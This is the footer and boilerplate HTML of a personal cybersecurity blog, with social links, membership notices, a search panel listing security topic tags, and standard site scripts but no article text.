<a href="https://www.instagram.com/flavsec/" aria-label="link Instagram"><svg class="global-svg" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"/></svg></a>
 <a href="https://www.linkedin.com/in/flaviu-popescu/" aria-label="link LinkedIn"><svg class="global-svg" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
<a href="https://www.youtube.com/channel/UCvILbl6MnRv8FdTBiFPXaRw" aria-label="link YouTube"><svg class="global-svg" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path class="a" d="M23.495 6.205a3.007 3.007 0 0 0-2.088-2.088c-1.87-.501-9.396-.501-9.396-.501s-7.507-.01-9.396.501A3.007 3.007 0 0 0 .527 6.205a31.247 31.247 0 0 0-.522 5.805 31.247 31.247 0 0 0 .522 5.783 3.007 3.007 0 0 0 2.088 2.088c1.868.502 9.396.502 9.396.502s7.506 0 9.396-.502a3.007 3.007 0 0 0 2.088-2.088 31.247 31.247 0 0 0 .5-5.783 31.247 31.247 0 0 0-.5-5.805zM9.609 15.601V8.408l6.264 3.602z"/></svg></a>
		</div>
	</div>
	<div class="footer-copyright">
<br><br><style>.bmc-button img{height: 34px !important;width: 35px !important;margin-bottom: 1px !important;box-shadow: none !important;border: none !important;vertical-align: middle !important;}.bmc-button{padding: 7px 15px 7px 10px !important;line-height: 35px !important;height:51px !important;text-decoration: none !important;display:inline-flex !important;color:#ffffff !important;background-color:#222327 !important;border-radius: 5px !important;border: 1px solid transparent !important;padding: 7px 15px 7px 10px !important;font-size: 20px !important;letter-spacing:-0.08px !important;box-shadow: 0px 1px 2px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;margin: 0 auto !important;font-family:'Lato', sans-serif !important;-webkit-box-sizing: border-box !important;box-sizing: border-box !important;}.bmc-button:hover, .bmc-button:active, .bmc-button:focus {-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;text-decoration: none !important;box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;opacity: 0.85 !important;color:#ffffff !important;}</style><link href="https://fonts.googleapis.com/css?family=Lato&subset=latin,latin-ext" rel="stylesheet"><a class="bmc-button" target="_blank" href="https://www.buymeacoffee.com/flaviu"><img src="https://flaviu.io/content/images/2020/bmc-new-btn-logo.svg" alt="Like my content? Get me a coffee please"><span style="margin-left:5px;font-size:19px !important;">Like my content? &#128521;</span></a></br></br>
                <a href="/cdn-cgi/l/email-protection#5e363b3232311e38323f28372b703731"><span class="__cf_email__" data-cfemail="6109040d0d0e21070d001708144f080e">[email&#160;protected]</span></a>
                <br><font color="green">{</font> "buildDate": "2020-06-21T09:30:53" <font color="green">}</font></br>
		&copy; 2025 <a href="https://flaviu.io">Flaviu Popescu</a>. All Right Reserved.
	</div>
</footer>
			<div class="members-notification subscribe-success">
	You&#x27;ve successfully subscribed to Flaviu Popescu
</div>
<div class="members-notification signin-success">
	Welcome back! You&#x27;ve successfully signed in.
</div>
<div class="members-notification signup-success">
	Great! You&#x27;ve successfully signed up.
</div>
<div class="members-notification checkout-success">
	Success! Your account is fully activated, you now have access to all content.
</div>
		</div>
		<div class="section-search flex" id="search">
	<div class="search-close"><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M15.4285714,12 L24,20.5714286 L20.5714286,24 L12,15.4285714 L3.42857143,24 L3.55271368e-15,20.5714286 L8.57142857,12 L5.32907052e-15,3.42857143 L3.42857143,3.55271368e-15 L12,8.57142857 L20.5714286,3.55271368e-15 L24,3.42857143 L15.4285714,12 Z"/></svg></div>
	<div class="search-image" style="background-image: url(https://flaviu.io/content/images/2020/06/room.jpg)">
	</div>
	<div class="search-wrap">
		<div class="search-content">
			<form class="search-form flex" onsubmit="if (!window.__cfRLUnblockHandlers) return false; return false" data-cf-modified-786429fe4b3ef8e688d249ce-="">
				<input type="text" class="search-input" placeholder="Type your keywords..." aria-label="Type your keywords...">
			</form>
			<div class="search-meta">
				<span class="search-info-wrap">Please enter at least 3 characters</span>
				<span class="search-counter-wrap hide">
					<span class="counter-results">0</span>
				Results for your search</span>
			</div>
			<div class="search-results">
			</div>
			<div class="search-suggestion flex">
				<div class="search-suggestion-tags">
	<h3>May we suggest a tag?</h3>
	<a class="post-tag global-tag" href="/tag/hacking/">hacking</a>
	<a class="post-tag global-tag" href="/tag/cybersecurity/">cybersecurity</a>
	<a class="post-tag global-tag" href="/tag/bugbounty/">bugbounty</a>
	<a class="post-tag global-tag" href="/tag/linux/">linux</a>
	<a class="post-tag global-tag" href="/tag/offensivesecurity/">offensivesecurity</a>
	<a class="post-tag global-tag" href="/tag/subdomaintakeover/">subdomaintakeover</a>
	<a class="post-tag global-tag" href="/tag/learning/">learning</a>
	<a class="post-tag global-tag" href="/tag/achievements/">achievements</a>
	<a class="post-tag global-tag" href="/tag/getting-started/">Getting Started</a>
	<a class="post-tag global-tag" href="/tag/crypto/">crypto</a>
	<a class="post-tag global-tag" href="/tag/china/">china</a>
	<a class="post-tag global-tag" href="/tag/censorship/">censorship</a>
	<a class="post-tag global-tag" href="/tag/backdoor/">backdoor</a>
	<a class="post-tag global-tag" href="/tag/apt/">apt</a>
	<a class="post-tag global-tag" href="/tag/ssh/">ssh</a>
	<a class="post-tag global-tag" href="/tag/id_rsa/">id_rsa</a>
	<a class="post-tag global-tag" href="/tag/irc/">irc</a>
	<a class="post-tag global-tag" href="/tag/octavis-io/">octavis.io</a>
	<a class="post-tag global-tag" href="/tag/start-up/">start-up</a>
	<a class="post-tag global-tag" href="/tag/web-design/">web design</a>
</div>
				<div class="search-suggestion-authors">
	<h3>May I suggest an author?</h3>
	<a class="post-tag global-tag" href="/author/flaviu/">Flaviu Popescu</a>
</div>
			</div>
		</div>
	        <div class="footer-copyright">
                <a href="/cdn-cgi/l/email-protection#97fff2fbfbf8d7f1fbf6e1fee2b9fef8"><span class="__cf_email__" data-cfemail="640c0108080b24020805120d114a0d0b">[email&#160;protected]</span></a><br>
                &copy; 2025 <a href="https://flaviu.io">Flaviu Popescu</a>.<br> All Right Reserved.</br>
		</div>
	</div>
</div>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="786429fe4b3ef8e688d249ce-text/javascript">
var searchPublished = 'Published',
	searchFeaturedIcon = '<svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M22.9712403,8.05987765 L16.2291373,8.05987765 L12.796794,0.459688839 C12.5516266,-0.153229613 11.4483734,-0.153229613 11.0806223,0.459688839 L7.64827899,8.05987765 L0.906176009,8.05987765 C0.538424938,8.05987765 0.170673866,8.30504503 0.0480901758,8.6727961 C-0.0744935148,9.04054717 0.0480901758,9.40829825 0.293257557,9.65346563 L5.31918887,14.3116459 L3.11268244,22.4021694 C2.99009875,22.7699205 3.11268244,23.1376716 3.48043351,23.382839 C3.72560089,23.6280063 4.21593565,23.6280063 4.46110303,23.5054227 L11.9387082,19.2149935 L19.4163133,23.5054227 C19.538897,23.6280063 19.6614807,23.6280063 19.906648,23.6280063 C20.1518154,23.6280063 20.2743991,23.5054227 20.5195665,23.382839 C20.7647339,23.1376716 20.8873176,22.7699205 20.8873176,22.4021694 L18.6808111,14.3116459 L23.7067424,9.65346563 C23.9519098,9.40829825 24.0744935,9.04054717 23.9519098,8.6727961 C23.7067424,8.30504503 23.3389914,8.05987765 22.9712403,8.05987765 Z"/></svg>',
	searchHost = 'https://flaviu.io',
	searchKey = "a800f4efacd68ba34390a4ddc8",
	searchAPI = searchHost+'/ghost/api/v3/content/posts/?key='+searchKey+'&limit=all&formats=plaintext&fields=url,title,featured,published_at,plaintext,excerpt,visibility'
</script>		<script src="/assets/js/post.js?v=daa65498fe" type="786429fe4b3ef8e688d249ce-text/javascript"></script>
		<script src="/assets/js/global.js?v=daa65498fe" type="786429fe4b3ef8e688d249ce-text/javascript"></script>
		<script src="/assets/js/ityped.js?v=daa65498fe" type="786429fe4b3ef8e688d249ce-text/javascript"></script>
		<script type="786429fe4b3ef8e688d249ce-text/javascript">
/* Notifications
   ââââââââââââââââââââââââââââââââââââââââââââââââââââ 
   Website : ghost.org
   Repo    : github.com/tryghost
   Author  : Ghost
   License : MIT
   ââââââââââââââââââââââââââââââââââââââââââââââââââââ */
function getParameterByName(e,n){n||(n=window.location.href),e=e.replace(/[\[\]]/g,"\\$&");var r=new RegExp("[?&]"+e+"(=([^&#]*)|&|#|$)").exec(n);return r?r[2]?decodeURIComponent(r[2].replace(/\+/g," ")):"":null}

/* Custom settings for notifications */
const action = getParameterByName('action'),
      stripe = getParameterByName('stripe'),
	  body = document.body;

if (action == 'subscribe') {
	body.classList.add("members-notification-subscribe");
}
if (action == 'signin') {
	body.classList.add("members-notification-signin");
}
if (action == 'signup') {
	body.classList.add("members-notification-signup");
}
if (stripe == 'success') {
	body.classList.add("members-notification-checkout-success");
}
</script>

		
		<!-- script tag -->
<script src="https://flaviu.io/content/images/js/prism.js" type="786429fe4b3ef8e688d249ce-text/javascript"></script>
<script type="786429fe4b3ef8e688d249ce-text/javascript">
document.addEventListener("DOMContentLoaded", function() {
   const g = document.getElementById("back-to-top");
   if (g) {
      window.addEventListener("scroll", function() {
         window.scrollY > 1000 ? g.classList.add("is-show") : g.classList.remove("is-show")
      }), g.addEventListener("click", function() {
         window.scrollTo(0, 0)
      })
   }
});
</script>
<script type="786429fe4b3ef8e688d249ce-text/javascript" src="https://cdn.jsdelivr.net/npm/@speechkit/speechkit-audio-player@latest/dist/speechkit-ghost.js?data=eyJwcm9qZWN0SWQiOiI2OTE5IiwiZ2siOiJjNmZlMzliYzVlMzFmYjhlMjJiZWQzNGQxNiIsInNrIjoid3JpdGVfMjI4NDYwMzU4NDMyOTAwNmQxY2U5NThkYWY3ZDkyNDUifQ=="></script>
	<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="786429fe4b3ef8e688d249ce-|49" defer></script></body>
</html>
